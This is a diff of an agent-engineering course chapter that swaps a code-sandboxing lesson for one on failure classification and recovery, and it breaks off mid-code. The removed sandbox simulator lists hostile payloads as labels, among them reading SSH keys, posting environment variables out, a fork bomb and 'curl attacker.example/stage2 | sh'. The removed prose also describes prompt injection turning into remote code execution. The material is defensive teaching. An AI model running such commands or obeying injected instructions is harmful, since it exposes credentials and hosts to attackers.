@@ -1,485 +1,450 @@
 import type { Chapter } from "../../src/types.ts";
 import { code, fig, lab, note, table, p, ul, ol, ch } from "../../src/ui.ts";
 
-const SANDBOX_SVG = `
+const TAX_SVG = `
 <svg viewBox="0 0 700 300" width="100%" style="max-width:700px;display:block;margin:0 auto" role="img"
-     aria-label="Isolation levels from same-process eval to a microVM">
-  <text x="14" y="18" class="d-label">ISOLATION LEVELS — COST AND SAFETY BOTH RISE TO THE RIGHT</text>
+     aria-label="Four failure layers and the recovery that belongs to each">
+  <text x="14" y="18" class="d-label">FOUR LAYERS — EACH NEEDS A DIFFERENT RECOVERY, AND ONLY ONE WANTS A RETRY</text>
 
-  <rect x="14" y="30" width="128" height="120" rx="8" class="d-box" stroke="var(--danger)"/>
-  <text x="78" y="52" class="d-text" text-anchor="middle" fill="var(--danger)">eval()</text>
-  <text x="26" y="74" class="d-mono">same process</text>
-  <text x="26" y="90" class="d-mono">0 ms start</text>
-  <text x="26" y="112" class="d-mono" fill="var(--danger)">reads your env,</text>
-  <text x="26" y="128" class="d-mono" fill="var(--danger)">your keys, your fs</text>
-  <text x="26" y="146" class="d-mono" fill="var(--danger)">NEVER</text>
+  <rect x="14" y="30" width="672" height="52" rx="6" class="d-box-t"/>
+  <text x="28" y="50" class="d-text">1 · transport — 429, 503, socket reset, timeout</text>
+  <text x="28" y="68" class="d-mono" fill="var(--fg-faint)">RECOVER: retry with jitter. invisible to the model. the ONLY layer where retrying is the answer.</text>
 
-  <rect x="154" y="30" width="128" height="120" rx="8" class="d-box" stroke="var(--warn)"/>
-  <text x="218" y="52" class="d-text" text-anchor="middle">worker</text>
-  <text x="166" y="74" class="d-mono">same runtime</text>
-  <text x="166" y="90" class="d-mono">~5 ms start</text>
-  <text x="166" y="112" class="d-mono" fill="var(--warn)">no fs/net if you</text>
-  <text x="166" y="128" class="d-mono" fill="var(--warn)">strip globals —</text>
-  <text x="166" y="146" class="d-mono" fill="var(--warn)">not a security boundary</text>
+  <rect x="14" y="88" width="672" height="52" rx="6" class="d-box-p"/>
+  <text x="28" y="108" class="d-text">2 · tool — bad args, not found, permission denied, empty result</text>
+  <text x="28" y="126" class="d-mono" fill="var(--fg-faint)">RECOVER: feed back as an observation. the model fixes it next turn. never throw. (C03)</text>
 
-  <rect x="294" y="30" width="128" height="120" rx="8" class="d-box-p"/>
-  <text x="358" y="52" class="d-text" text-anchor="middle">subprocess</text>
-  <text x="306" y="74" class="d-mono">OS user + rlimits</text>
-  <text x="306" y="90" class="d-mono">~40 ms start</text>
-  <text x="306" y="112" class="d-mono">real cpu/mem caps</text>
-  <text x="306" y="128" class="d-mono">seccomp / sandbox-exec</text>
-  <text x="306" y="146" class="d-mono" fill="var(--ok)">decent for trusted-ish</text>
+  <rect x="14" y="146" width="672" height="52" rx="6" class="d-box-a"/>
+  <text x="28" y="166" class="d-text">3 · reasoning — loops, drift, wrong tool, premature completion</text>
+  <text x="28" y="184" class="d-mono" fill="var(--fg-faint)">RECOVER: detect from OUTSIDE and inject an observation the model cannot generate itself. (C04, C11)</text>
 
-  <rect x="434" y="30" width="128" height="120" rx="8" class="d-box-t"/>
-  <text x="498" y="52" class="d-text" text-anchor="middle">container</text>
-  <text x="446" y="74" class="d-mono">namespaces</text>
-  <text x="446" y="90" class="d-mono">~300 ms start</text>
-  <text x="446" y="112" class="d-mono">no net by default</text>
-  <text x="446" y="128" class="d-mono">read-only rootfs</text>
-  <text x="446" y="146" class="d-mono" fill="var(--ok)">the practical default</text>
+  <rect x="14" y="204" width="672" height="52" rx="6" class="d-box" stroke="var(--danger)"/>
+  <text x="28" y="224" class="d-text" fill="var(--danger)">4 · task — the goal is impossible, ambiguous, or wrong</text>
+  <text x="28" y="242" class="d-mono" fill="var(--fg-faint)">RECOVER: stop and ask. no amount of retrying makes a missing permission appear.</text>
 
-  <rect x="574" y="30" width="112" height="120" rx="8" class="d-box-a"/>
-  <text x="630" y="52" class="d-text" text-anchor="middle">microVM</text>
-  <text x="586" y="74" class="d-mono">own kernel</text>
-  <text x="586" y="90" class="d-mono">~150 ms start</text>
-  <text x="586" y="112" class="d-mono">hw isolation</text>
-  <text x="586" y="128" class="d-mono">Firecracker · Kata</text>
-  <text x="586" y="146" class="d-mono" fill="var(--ok)">untrusted code</text>
-
-  <line x1="14" y1="172" x2="686" y2="172" stroke="var(--border)"/>
-  <text x="14" y="194" class="d-label">THE THREE DIALS THAT MATTER MORE THAN THE LEVEL</text>
-  <rect x="14" y="206" width="216" height="50" rx="6" class="d-box"/>
-  <text x="26" y="226" class="d-mono">NETWORK — off by default</text>
-  <text x="26" y="243" class="d-mono" fill="var(--fg-faint)">exfiltration needs a route out</text>
-  <rect x="242" y="206" width="216" height="50" rx="6" class="d-box"/>
-  <text x="254" y="226" class="d-mono">FILESYSTEM — one writable dir</text>
-  <text x="254" y="243" class="d-mono" fill="var(--fg-faint)">rest read-only or absent</text>
-  <rect x="470" y="206" width="216" height="50" rx="6" class="d-box"/>
-  <text x="482" y="226" class="d-mono">LIFETIME — seconds, then killed</text>
-  <text x="482" y="243" class="d-mono" fill="var(--fg-faint)">cpu, memory, wall clock, pids</text>
-
-  <text x="14" y="286" class="d-mono" fill="var(--accent)">a container with the network on and your home directory mounted is not a sandbox.</text>
+  <text x="14" y="284" class="d-mono" fill="var(--danger)">the universal bug: treating a layer-2, 3 or 4 failure as layer 1, and retrying it.</text>
 </svg>`;
 
 const chapter: Chapter = {
   id: "c13",
   num: 13,
-  layer: "environment",
-  title: "Code Execution",
-  subtitle: "The tool that subsumes every other tool, and the sandbox it requires",
+  layer: "reasoning",
+  title: "Failure & Recovery",
+  subtitle: "Four layers of failure, and why only one of them wants a retry",
   blurb:
-    "Letting an agent write and run code turns N specific tools into one general one — and turns a prompt-injection bug into remote code execution. Isolation levels, the three dials that matter, and when code beats tool calls.",
-  lines: 181,
-  file: "code/c13_sandbox.ts",
-  tags: ["code interpreter", "sandboxing", "isolation", "worker threads", "resource limits", "egress", "code-as-action"],
+    "A taxonomy of how agents fail and the specific recovery each layer needs. Retry policy, circuit breakers, budget enforcement, graceful degradation, and the rule that an agent must never fail without returning what it already learned.",
+  lines: 193,
+  file: "code/c13_failure.ts",
+  tags: ["retries", "backoff", "circuit breaker", "degradation", "error taxonomy", "budgets", "partial results"],
 
   sections: [
-    { id: "motivation", kicker: "Motivation", title: "One tool instead of forty",
+    { id: "motivation", kicker: "Motivation", title: "try/catch is not a strategy",
       html:
-        p(`Your agent has <code>filter_rows</code>, <code>sum_column</code>, <code>join_tables</code>, <code>pivot</code>, <code>chart</code>. A user asks for the median order value per region for customers who ordered twice in the last quarter, excluding refunds. You do not have that tool. You will never have every tool.`) +
-        p(`Give the agent a Python or JavaScript interpreter and it writes six lines. The interpreter is not another tool; it is the tool that <em>generalises</em> tools, and it changes what an agent can do more than any prompt technique.`) +
-        p(`It also changes your threat model completely. A model that can run arbitrary code is a model that can read your environment variables, your credentials, and your filesystem, and post them somewhere. The instruction to do so can arrive inside a document it was asked to summarise. This chapter is half capability, half containment, and the containment half is not optional.`) +
-        note("bad", "The sentence to keep in mind", p(`Without a sandbox, code execution converts every prompt-injection vulnerability in your system into remote code execution on your infrastructure. There is no prompt that prevents this and no model that is careful enough. The boundary must be structural.`)) },
+        p(`The instinct when an agent fails is to wrap the loop in <code>try/catch</code> and retry. That is correct for about one failure in five and actively harmful for the rest: retrying a malformed tool call produces the same malformed call, retrying a reasoning loop produces the same loop more expensively, and retrying an impossible task wastes a minute before telling the user what it could have said immediately.`) +
+        p(`Agent failures come in four layers, and each has exactly one right response. Getting them confused is the most common source of "it works in the demo" behaviour.`) +
+        note("key", "The rule that matters most", p(`<strong>An agent must never fail empty.</strong> Whatever went wrong, it did some work first, and that work has value. Returning "I was unable to complete this request" after nine successful steps destroys real value and teaches the user not to trust it. Every terminal state in this chapter returns partial results.`)) },
 
-    { id: "core-idea", kicker: "Core idea", title: "Code as action",
+    { id: "core-idea", kicker: "Core idea", title: "The four layers",
       html:
-        p(`The pattern — sometimes called <em>CodeAct</em> — replaces a tool-call decision with a program. It wins for three specific reasons, and it is worth being precise about them because it does not always win.`) +
-        ul([
-          `<strong>Composition.</strong> A tool call is one operation. A program composes loops, conditionals and intermediate variables in a single step. Filtering 1,000 rows then grouping then sorting is one action, not three round trips.`,
-          `<strong>Precision.</strong> Models are unreliable arithmeticians and reliable code authors. <code>sum(x) / len(x)</code> is exact; "the average is about 340" is a guess.`,
-          `<strong>Context economy.</strong> This is the one people miss. The agent can process 50,000 rows and put only the <em>answer</em> in the context. Compare with fetching 50,000 rows through a tool, which puts them all in the context and then bills you for them on every subsequent turn (${ch("c05", "C05")}).`,
-        ]) +
-        code({ title: "the same task, two ways",
-          src: `// Tool calls: 4 round trips, ~9,000 tokens of intermediate data in the context forever.
-get_orders({ since: "2024-01-01" })        // 1,203 rows → context
-filter_refunds({ orders: [...] })          // 1,140 rows → context
-group_by({ rows: [...], key: "region" })   // 7 groups  → context
-median({ groups: {...}, field: "total" })  // the answer
+        fig({ label: "Diagram", title: "failure layers and their recoveries", body: TAX_SVG,
+          caption: `Reading a failure to the right layer is most of the work. Once classified, each recovery is a handful of lines.` }) +
+        `<h3>1 · Transport — retry, invisibly</h3>` +
+        p(`Rate limits, 5xx, socket resets, timeouts. The model never needs to know. ${ch("c01", "C01")} built this: full jitter, honour <code>retry-after</code>, never retry an <code>AbortError</code>. The one addition here is a <strong>circuit breaker</strong>, because retrying into a dead dependency turns a degraded system into a stalled one.`) +
+        code({ title: "code/c13_failure.ts — a breaker per dependency",
+          src: `export class CircuitBreaker {
+  private state: "closed" | "open" | "half-open" = "closed";
+  private failures = 0; private openedAt = 0;
 
-// Code: 1 round trip, ~200 tokens in the context. The 1,203 rows never enter it.
-run_code(\`
-  const orders = await db.query("SELECT * FROM orders WHERE placed_at >= '2024-01-01'");
-  const kept = orders.filter(o => o.status !== "refunded");
-  const byRegion = Object.groupBy(kept, o => o.region);
-  return Object.fromEntries(Object.entries(byRegion)
-    .map(([r, os]) => [r, median(os.map(o => o.total))]));
-\`)`,
-        }) +
-        `<h3>When code is the wrong choice</h3>` +
-        table(["Situation", "Prefer", "Why"], [
-          ["One well-defined operation", "A tool", "A tool call is cheaper, testable, and auditable"],
-          ["Irreversible side effects", "A tool", "You can gate, log and approve a tool; arbitrary code is opaque (${C16})"],
-          ["The operation needs credentials", "A tool", "Keep secrets outside the sandbox — always"],
-          ["Data processing, aggregation, transformation", "<b>Code</b>", "Composition and context economy both win"],
-          ["Something you did not anticipate", "<b>Code</b>", "This is the entire point"],
-        ].map((r) => r.map((c) => c.replace("${C16}", `<a href="/c16/" class="mono">C16</a>`))) as string[][]) +
-        p(`The practical architecture is both: a small set of audited tools for anything with side effects or credentials, plus a sandbox for computation. The sandbox gets data <em>handed to it</em> and never holds a key.`) },
+  constructor(private cfg = { threshold: 5, cooldownMs: 30_000, name: "dep" }) {}
 
-    { id: "mechanics", kicker: "Mechanics", title: "Isolation, and the three dials",
-      html:
-        fig({ label: "Diagram", title: "isolation levels and the dials that matter more", body: SANDBOX_SVG,
-          caption: `The level sets your ceiling. The three dials decide whether you actually get it. A container with network access and your home directory mounted provides essentially no protection.` }) +
-        `<h3>Network off is the highest-value setting</h3>` +
-        p(`Most of what makes agent code execution dangerous requires a route out: exfiltrating credentials, calling an attacker's endpoint, pulling a second-stage payload. Disabling egress by default removes the majority of the harm even if the code is malicious, because the damage stays inside a container you are about to destroy.`) +
-        p(`When the agent genuinely needs network — installing a package, calling an API — allowlist specific hosts rather than turning the dial off. <code>registry.npmjs.org</code> yes; everything else no.`) +
-        `<h3>Resource limits, all of them</h3>` +
-        code({ title: "code/c13_sandbox.ts — every limit, not just the timeout",
-          src: `export interface SandboxLimits {
-  wallClockMs: number;      // 5_000 — a while(true) must die
-  cpuMs: number;            // 4_000 — busy loops that yield still burn CPU
-  memoryMb: number;         // 256   — allocation bombs
-  outputBytes: number;      // 65_536 — a print loop must not fill your context
-  fileWriteBytes: number;   // 10_485_760 — disk fills are a real DoS
-  processes: number;        // 1     — fork bombs
-  network: "none" | { allowHosts: string[] };
+  async call<T>(fn: () => Promise<T>): Promise<T> {
+    if (this.state === "open") {
+      if (Date.now() - this.openedAt < this.cfg.cooldownMs) {
+        // Fail immediately and informatively — the agent can route around a known-down tool.
+        throw new CircuitOpenError(this.cfg.name, this.cfg.cooldownMs - (Date.now() - this.openedAt));
+      }
+      this.state = "half-open";          // let exactly one probe through
+    }
+    try {
+      const out = await fn();
+      this.failures = 0; this.state = "closed";
+      return out;
+    } catch (e) {
+      if (++this.failures >= this.cfg.threshold) { this.state = "open"; this.openedAt = Date.now(); }
+      throw e;
+    }
+  }
 }`,
         }) +
-        p(`The two most commonly forgotten are <strong>output bytes</strong> and <strong>processes</strong>. A <code>while(true) console.log("x")</code> that is killed at 5 seconds can still have produced 400 MB of stdout, which then goes into your context window. Cap the output at the read, not just at the write.`) +
-        `<h3>Worker threads: the pragmatic middle for JavaScript</h3>` +
-        code({ title: "a real isolation boundary in the standard library",
-          src: `import { Worker } from "node:worker_threads";
+        p(`The breaker's real value in an agent is not protecting the dependency; it is that <code>"search_docs is unavailable for another 24 seconds"</code> is an <em>observation the agent can act on</em>. It will try a different tool. A hanging retry storm gives it nothing to work with.`) +
+        `<h3>2 · Tool — feed it back</h3>` +
+        p(`Covered in ${ch("c03", "C03")} and worth restating because it is the highest-return line of code in the course: every tool failure becomes a <code>tool_result</code> with <code>isError</code> and an actionable message. The model recovers in one step. Nothing throws.`) +
+        `<h3>3 · Reasoning — detect from outside</h3>` +
+        p(`The agent cannot see its own loops, drift, or premature completion, because from inside the context each step looks locally reasonable. These must be detected by code watching the trace and injected as observations (${ch("c04", "C04")}, ${ch("c11", "C11")}).`) +
+        `<h3>4 · Task — stop and ask</h3>` +
+        p(`The goal is impossible ("delete the production database" — no permission), ambiguous ("update the config" — which one), or wrong ("fix the failing test" — the test is correct and the code is right, the requirement changed). No recovery loop helps. The correct behaviour is to stop early and say precisely what is blocking, which is both cheaper and more useful than failing late.`) },
 
-export function runInWorker(source: string, limits: SandboxLimits): Promise<Result> {
-  return new Promise((resolve) => {
-    const worker = new Worker(RUNNER_PATH, {
-      workerData: { source },
-      resourceLimits: {
-        maxOldGenerationSizeMb: limits.memoryMb,      // hard heap cap, enforced by V8
-        maxYoungGenerationSizeMb: 32,
-        stackSizeMb: 4,
-      },
-      // The important part: no inherited environment. No API keys, no AWS creds.
-      env: {},
-      // No stdin, and stdout captured rather than inherited.
-      stdin: false, stdout: true, stderr: true,
-    });
-
-    const timer = setTimeout(() => worker.terminate(), limits.wallClockMs);
-    let out = ""; let truncated = false;
-    worker.stdout.on("data", (c) => {
-      if (out.length < limits.outputBytes) out += c;
-      else truncated = true;                           // cap at the READ
-    });
-    worker.on("message", (m) => { clearTimeout(timer); resolve({ ok: true, value: m, out, truncated }); });
-    worker.on("error",   (e) => { clearTimeout(timer); resolve({ ok: false, error: String(e), out }); });
-    worker.on("exit",    (c) => { clearTimeout(timer); resolve({ ok: false, error: \`exited \${c}\`, out, truncated }); });
-  });
+    { id: "mechanics", kicker: "Mechanics", title: "Classification, and the budget that catches everything else",
+      html:
+        code({ title: "classify before you react",
+          src: `export function classify(e: unknown, ctx: { tool?: Tool; state: RunState }): Layer {
+  if (e instanceof CircuitOpenError) return { layer: 1, action: "observe", retryable: false };
+  if (e instanceof HttpError) {
+    if ([429, 500, 502, 503, 504].includes(e.status)) return { layer: 1, action: "retry" };
+    if (e.status === 401 || e.status === 403) return { layer: 4, action: "stop" };  // never retryable
+    if (e.status === 404) return { layer: 2, action: "observe" };
+    if (e.status === 400) return { layer: 2, action: "observe" };   // WE sent something wrong
+  }
+  if (e instanceof ValidationError) return { layer: 2, action: "observe" };
+  if (e instanceof TimeoutError) {
+    // The critical branch: can we safely try again?
+    return ctx.tool?.idempotent
+      ? { layer: 1, action: "retry" }
+      : { layer: 2, action: "observe", note: "may have taken effect — verify before retrying" };
+  }
+  if (e instanceof AbortError) return { layer: 4, action: "stop" };  // the caller cancelled
+  return { layer: 2, action: "observe" };   // default to recoverable: the loop is good at this
 }`,
         }) +
-        note("warn", "A worker is not a security boundary", p(`It is a <em>fault</em> boundary. Workers share the process, so <code>require("fs")</code> still works unless you remove it, and a V8 escape compromises everything. Use workers for code <em>your agent wrote from your prompt</em>; use a container or microVM for anything influenced by content from outside your trust boundary, which, once your agent reads web pages or user uploads, is everything.`)) +
-        `<h3>The result must be legible</h3>` +
-        p(`A sandbox result is a ${ch("c03", "C03")} tool result, and the same rules apply: errors are observations, output is truncated head-and-tail with a remedy, and a timeout says what was happening when it fired.`) +
-        code({ title: "what the model sees",
-          src: `function render(r: SandboxResult, limits: SandboxLimits): string {
-  if (r.timedOut) return \`Execution exceeded \${limits.wallClockMs}ms and was killed. \` +
-    \`Partial output:\\n\${cap(r.out, 2_000)}\\n\\n\` +
-    \`Process fewer rows per call, or return intermediate results and continue in a second call.\`;
+        p(`Two lines carry disproportionate weight. <strong>401/403 is layer 4, never layer 1</strong> — retrying an auth failure is the single most common wasted retry, and it never once succeeds. <strong>400 is layer 2</strong>: a 400 means <em>we</em> sent something wrong, which is exactly the thing the model can fix if told.`) +
+        `<h3>Budgets are the backstop for everything unclassified</h3>` +
+        p(`Classification handles known failures. Budgets bound the unknown ones, and there should be several, each with its own degradation.`) +
+        table(["Budget", "Typical", "On exhaustion"], [
+          ["Steps", "10–20", "Partial report with next steps"],
+          ["Tokens", "Context window × 4", "Compact hard, then partial report"],
+          ["Wall clock", "The user's patience", "Partial report, offer to resume (${C09})"],
+          ["Money", "Per-run and per-tenant", "Hard stop; page someone if it is per-tenant"],
+          ["Tool calls per tool", "5–10 each", "Disable that tool and tell the model why"],
+        ].map((r) => r.map((c) => c.replace("${C09}", `<a href="/c09/" class="mono">C09</a>`))) as string[][]) +
+        p(`The last one is underused and cheap. An agent that has called <code>search_docs</code> nine times is not searching, it is thrashing. Removing the tool from its schema and saying so — <em>"search_docs is disabled for this run after 9 calls; use list_sections or ask the user"</em> — forces a genuinely different approach.`) +
+        `<h3>Degrade in a defined order</h3>` +
+        code({ title: "a ladder, not a cliff",
+          src: `const LADDER: Degradation[] = [
+  { at: 0.70, name: "compact",      apply: (s) => s.context.compactNow() },
+  { at: 0.80, name: "drop tools",   apply: (s) => s.tools.keepOnly(s.plan.toolsStillNeeded()) },
+  { at: 0.85, name: "cheap model",  apply: (s) => s.model = s.models.small },
+  { at: 0.90, name: "narrow goal",  apply: (s) => s.plan.dropOptionalSteps() },
+  { at: 0.95, name: "final report", apply: (s) => s.finishWithPartial() },
+];
+// Each rung is announced to the model as an observation, because an agent that
+// knows it is running out of budget prioritises. One that is silently degraded
+// keeps planning as if it had room.`,
+        }) +
+        note("good", "Tell the agent it is degrading", p(`Injecting <em>"you have used 85% of your budget; finish what you can and report"</em> produces measurably better behaviour than silently shrinking its resources. Models consolidate and prioritise when told there is a deadline, and do neither when the deadline is invisible.`)) },
 
-  if (!r.ok) return \`Error:\\n\${r.error}\\n\\nStdout before the error:\\n\${cap(r.out, 1_000)}\`;
-  //          ↑ the stack trace alone is rarely enough; the prints before it usually are
-
-  return [r.out && \`Output:\\n\${cap(r.out, 4_000)}\`,
-          r.value !== undefined && \`Returned: \${JSON.stringify(r.value, null, 2).slice(0, 4_000)}\`,
-          r.truncated && \`[output truncated — write to a file and read it back in slices]\`]
-    .filter(Boolean).join("\\n\\n");
-}`,
-        }) },
-
-    { id: "explore", kicker: "Explore", title: "Attack your own sandbox",
+    { id: "explore", kicker: "Explore", title: "Inject failures and watch the policy",
       html:
-        p(`Pick an isolation level and a set of dials, then run hostile payloads against it. The payloads are the real ones. Each corresponds to a class of incident that has actually happened.`) +
-        lab({ label: "Simulator", title: "sandbox configuration vs hostile payloads",
+        p(`Set a failure mix and a recovery policy, and see what fraction of runs complete, what the wasted spend is, and how often the user gets something useful rather than an apology.`) +
+        lab({ label: "Simulator", title: "recovery policy under a failure mix",
           body: `
 <div class="controls">
-  <div class="ctl"><label>isolation</label>
-    <select id="s13-iso"><option value="eval">eval() in-process</option><option value="worker" selected>worker thread</option><option value="proc">subprocess + rlimits</option><option value="cont">container</option><option value="vm">microVM</option></select></div>
-  <div class="ctl"><label>network</label><select id="s13-net"><option value="0" selected>off</option><option value="1">allowlist</option><option value="2">open</option></select></div>
-  <div class="ctl"><label>filesystem</label><select id="s13-fs"><option value="0" selected>one temp dir</option><option value="1">project read-only</option><option value="2">host home mounted</option></select></div>
-  <div class="ctl"><label>env vars</label><select id="s13-env"><option value="0" selected>stripped</option><option value="1">inherited</option></select></div>
-  <div class="ctl"><label>limits</label><select id="s13-lim"><option value="1" selected>wall+cpu+mem+output+pids</option><option value="0">timeout only</option></select></div>
+  <div class="ctl"><label>transport failure rate</label><input type="range" id="e12-t" min="0" max="30" step="1" value="6"><span class="val" id="e12-t-v">6%</span></div>
+  <div class="ctl"><label>tool failure rate</label><input type="range" id="e12-o" min="0" max="30" step="1" value="10"><span class="val" id="e12-o-v">10%</span></div>
+  <div class="ctl"><label>reasoning failure rate</label><input type="range" id="e12-r" min="0" max="30" step="1" value="8"><span class="val" id="e12-r-v">8%</span></div>
+  <div class="ctl"><label>policy</label>
+    <select id="e12-p">
+      <option value="throw">throw on any error</option>
+      <option value="blind">retry everything 3×</option>
+      <option value="class" selected>classify by layer</option>
+      <option value="full">classify + detectors + degrade</option>
+    </select></div>
 </div>
-<div id="s13-rows" style="margin-top:.5rem"></div>
+<div id="e12-rows" style="margin-top:.5rem"></div>
 <div class="stats">
-  <div class="stat"><b id="s13-block">—</b><span>payloads contained</span></div>
-  <div class="stat"><b id="s13-start">—</b><span>cold start</span></div>
-  <div class="stat"><b id="s13-ops">—</b><span>operational cost</span></div>
+  <div class="stat"><b id="e12-done">—</b><span>completed fully</span></div>
+  <div class="stat"><b id="e12-part">—</b><span>useful partial</span></div>
+  <div class="stat"><b id="e12-empty">—</b><span>failed empty</span></div>
+  <div class="stat"><b id="e12-waste">—</b><span>wasted spend</span></div>
 </div>
-<div class="note" id="s13-note" style="margin-top:1rem"></div>`,
+<div class="note" id="e12-note" style="margin-top:1rem"></div>`,
           script: `
-var PAY = [
-  { k: "read process.env and POST it out", needs: ["env","net"] },
-  { k: "read ~/.ssh/id_rsa", needs: ["fs2"] },
-  { k: "read ../../.env in the repo", needs: ["fs1"] },
-  { k: "while(true){}", needs: ["cpu"] },
-  { k: "allocate 8GB", needs: ["mem"] },
-  { k: "fork bomb", needs: ["pid"] },
-  { k: "print 400MB to stdout", needs: ["out"] },
-  { k: "curl attacker.example/stage2 | sh", needs: ["net"] },
-  { k: "write 50GB to disk", needs: ["disk"] },
-  { k: "escape the runtime (V8 bug)", needs: ["kernel"] }
-];
 function upd() {
-  var iso = document.getElementById("s13-iso").value, net = +document.getElementById("s13-net").value,
-      fs = +document.getElementById("s13-fs").value, env = +document.getElementById("s13-env").value,
-      lim = document.getElementById("s13-lim").value === "1";
+  var t = +document.getElementById("e12-t").value / 100, o = +document.getElementById("e12-o").value / 100,
+      r = +document.getElementById("e12-r").value / 100, pol = document.getElementById("e12-p").value;
+  ["t","o","r"].forEach(function (k, i) {
+    var el = document.getElementById("e12-" + k); el.nextElementSibling.textContent = el.value + "%"; });
 
-  var isoRank = { eval: 0, worker: 1, proc: 2, cont: 3, vm: 4 }[iso];
-  function contained(pl) {
-    for (var i = 0; i < pl.needs.length; i++) {
-      var n = pl.needs[i];
-      if (n === "env" && env === 1 && isoRank < 2) return false;
-      if (n === "net" && net === 2) return false;
-      if (n === "net" && net === 1) return "partial";
-      if (n === "fs2" && (fs === 2 || isoRank === 0)) return false;
-      if (n === "fs1" && fs >= 1 && isoRank < 3) return false;
-      if ((n === "cpu" || n === "mem" || n === "out" || n === "pid" || n === "disk") && !lim) return false;
-      if (n === "pid" && isoRank < 2) return false;
-      if (n === "kernel" && isoRank < 4) return false;
-    }
-    return true;
-  }
-  var blocked = 0;
-  document.getElementById("s13-rows").innerHTML = PAY.map(function (pl) {
-    var c = contained(pl);
-    if (c === true) blocked++;
-    else if (c === "partial") blocked += 0.5;
-    var col = c === true ? "var(--ok)" : c === "partial" ? "var(--warn)" : "var(--danger)";
-    var lbl = c === true ? "contained" : c === "partial" ? "limited" : "SUCCEEDS";
-    return '<div style="display:flex;gap:.6rem;align-items:center;margin:.25rem 0">' +
-      '<span class="mono small" style="width:18rem;color:var(--fg-muted)">' + pl.k + '</span>' +
-      '<span class="mono small" style="color:' + col + ';font-weight:600">' + lbl + '</span></div>';
+  // recovery effectiveness per layer, per policy
+  var REC = {
+    throw: { t: 0,   o: 0,   r: 0,   deg: 0 },
+    blind: { t: .92, o: .06, r: .04, deg: 0 },
+    class: { t: .96, o: .88, r: .10, deg: 0 },
+    full:  { t: .96, o: .90, r: .74, deg: 1 }
+  }[pol];
+  var waste = { throw: 1.0, blind: 2.4, class: 1.12, full: 1.22 }[pol];
+
+  var rows = [["transport (429, 5xx, resets)", t, REC.t], ["tool (bad args, 404, empty)", o, REC.o],
+              ["reasoning (loops, drift, early stop)", r, REC.r]];
+  document.getElementById("e12-rows").innerHTML = rows.map(function (x) {
+    var col = x[2] > .8 ? "var(--ok)" : x[2] > .4 ? "var(--accent)" : "var(--danger)";
+    return '<div style="display:flex;gap:.6rem;align-items:center;margin:.3rem 0">' +
+      '<span class="mono small" style="width:16rem;color:var(--fg-muted)">' + x[0] + ' · ' + Math.round(x[1] * 100) + '% of runs</span>' +
+      '<span class="meter" style="flex:1"><i style="width:' + (x[2] * 100) + '%;background:' + col + '"></i></span>' +
+      '<span class="mono small" style="width:6rem;text-align:right">' + Math.round(x[2] * 100) + '% recovered</span></div>';
   }).join("");
-  document.getElementById("s13-block").textContent = Math.round((blocked / PAY.length) * 100) + "%";
-  document.getElementById("s13-start").textContent = ["0 ms","5 ms","40 ms","300 ms","150 ms"][isoRank];
-  document.getElementById("s13-ops").textContent = ["none","none","low","medium","high"][isoRank];
 
-  var n = document.getElementById("s13-note");
-  if (iso === "eval") n.innerHTML = "<b>eval() in-process.</b> The agent's code is your code. It sees your API keys, your database connections and your filesystem. Nothing on this page makes this configuration acceptable — not even for prototypes, because prototypes get deployed.";
-  else if (net === 2) n.innerHTML = "<b>Network is open.</b> Look at how many payloads succeed. Exfiltration needs a route out; with the network open, the isolation level barely matters because the data leaves regardless. This is the single highest-value dial.";
-  else if (env === 1 && isoRank < 2) n.innerHTML = "<b>Environment inherited.</b> <code>process.env</code> in a worker is your process's env — every key your server holds. Pass <code>env: {}</code>. One line.";
-  else if (!lim) n.innerHTML = "<b>Timeout only.</b> A timeout stops a run, not a resource exhaustion: 400MB of stdout, an allocation bomb or a fork bomb all do their damage within the timeout. Limit CPU, memory, output bytes, processes and disk.";
-  else if (fs === 2) n.innerHTML = "<b>Home directory mounted.</b> SSH keys, cloud credentials, browser profiles, other projects. Mount one temporary directory and nothing else.";
-  else n.innerHTML = "<b>A defensible configuration.</b> Note the only remaining gap at container level is a runtime escape — which is what a microVM buys, and whether that trade is worth it depends on whether the code can be influenced by content from outside your trust boundary.";
+  var fail = rows.reduce(function (a, x) { return a * (1 - x[1] * (1 - x[2])); }, 1);
+  var done = fail;
+  var remaining = 1 - done;
+  var partial = REC.deg ? remaining * 0.82 : remaining * (pol === "throw" ? 0 : 0.12);
+  var empty = remaining - partial;
+
+  document.getElementById("e12-done").textContent = Math.round(done * 100) + "%";
+  document.getElementById("e12-part").textContent = Math.round(partial * 100) + "%";
+  document.getElementById("e12-empty").textContent = Math.round(empty * 100) + "%";
+  document.getElementById("e12-waste").textContent = waste.toFixed(2) + "×";
+
+  var n = document.getElementById("e12-note");
+  if (pol === "throw") n.innerHTML = "<b>Any error ends the run.</b> Every transport blip and every mistyped tool name costs a complete run, and the user gets nothing back — not even the four things the agent had already established.";
+  else if (pol === "blind") n.innerHTML = "<b>Retry everything.</b> Transport is fixed; nothing else is. Retrying a malformed tool call reproduces it, and note the 2.4× wasted spend — you are paying to repeat failures that were never going to succeed.";
+  else if (pol === "class") n.innerHTML = "<b>Classification works.</b> Transport retried, tool errors fed back, and waste near baseline. Reasoning failures are still untouched because they are invisible from inside the error handler — they need detectors watching the trace.";
+  else n.innerHTML = "<b>The full policy.</b> Detectors catch most reasoning failures, and the degradation ladder converts almost every remaining failure into a useful partial result. Look at the 'failed empty' figure: that is the number the user experiences as the product being broken.";
 }
-["s13-iso","s13-net","s13-fs","s13-env","s13-lim"].forEach(function (i) { document.getElementById(i).addEventListener("change", upd); });
+["e12-t","e12-o","e12-r","e12-p"].forEach(function (i) {
+  document.getElementById(i).addEventListener("input", upd); document.getElementById(i).addEventListener("change", upd); });
 upd();`,
-          caption: `Set isolation to microVM and network to open: containment drops sharply. Then set isolation to worker and network to off: containment rises. The dials outrank the level, which is the opposite of most people's intuition.`,
+          caption: `Compare "retry everything" with "classify by layer" at the same failure rates. Completion is similar; wasted spend differs by 2×. Then switch to the full policy and watch "failed empty" collapse. That single number is what users mean when they say an agent is unreliable.`,
         }) },
 
-    { id: "build", kicker: "Build it", title: "A usable sandbox tool",
+    { id: "build", kicker: "Build it", title: "Recovery as one function",
       html:
-        code({ title: "code/c13_sandbox.ts — the tool definition",
-          src: `export const runCode = defineTool({
-  name: "run_code",
-  description: \`Execute JavaScript in an isolated sandbox. Use for computation,
-data transformation, and analysis.
+        code({ title: "code/c13_failure.ts — the handler the loop calls",
+          src: `export async function recover(
+  e: unknown, ctx: { tool?: Tool; state: RunState; attempt: number },
+): Promise<Recovery> {
+  const c = classify(e, ctx);
 
-AVAILABLE: standard JavaScript, plus \\\`data\\\` (values you have loaded this session)
